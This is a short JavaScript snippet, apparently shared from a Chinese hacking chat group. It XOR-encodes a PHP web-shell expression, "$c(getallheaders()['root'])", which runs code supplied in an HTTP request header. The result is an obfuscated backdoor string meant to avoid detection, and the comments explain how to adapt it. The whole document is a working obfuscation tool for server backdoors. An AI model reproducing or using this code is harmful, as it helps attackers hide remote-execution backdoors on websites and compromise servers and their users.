// 此代码为2023-04-08.php 里的二次生成密文版，只需要替换异或的第一部分字符串就好了
// 感谢群友的无私奉献，我就直接拿来放到这里了

function xorDecrypt(cipherText, key) {
  let plainText = '';
  for (let i = 0; i < cipherText.length; i++) {
    let cipherCharCode = cipherText.charCodeAt(i);
    let keyCharCode = key.charCodeAt(i % key.length);
    let plainCharCode = cipherCharCode ^ keyCharCode;
    plainText += String.fromCharCode(plainCharCode);
  }
  return plainText;
}

let cipherText = "$c(getallheaders()['root'])";
// cipherText 可以修改起里面获取的内容
let key = String.raw`t?~KI\OB)+8"X(A6K|{L5L&J]kf~`;
let plainText = xorDecrypt(cipherText, key);
console.log(plainText);
